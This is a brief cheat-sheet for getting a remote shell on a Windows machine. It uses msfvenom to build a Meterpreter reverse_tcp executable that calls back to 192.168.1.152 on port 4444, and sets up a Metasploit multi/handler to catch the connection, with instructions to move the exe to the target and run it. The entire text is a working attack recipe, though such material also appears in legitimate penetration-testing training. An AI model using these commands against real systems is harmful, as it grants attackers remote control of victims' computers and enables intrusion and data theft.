WINDOWS ATTACK BY PAYLOAD

#msfvenom -p windows/meterpreter/reverse_tcp LHOST 192.168.1.152 LPORT=4444 -f exe > shell.exe

* Move this file to windows

#msfconsole
#use multi/handler
#set payload windows/meterpreter/reverse_tcp
#set LHOST 192.168.1.152
#set LPORT 4444
#exploit

* Run the exe on windows	
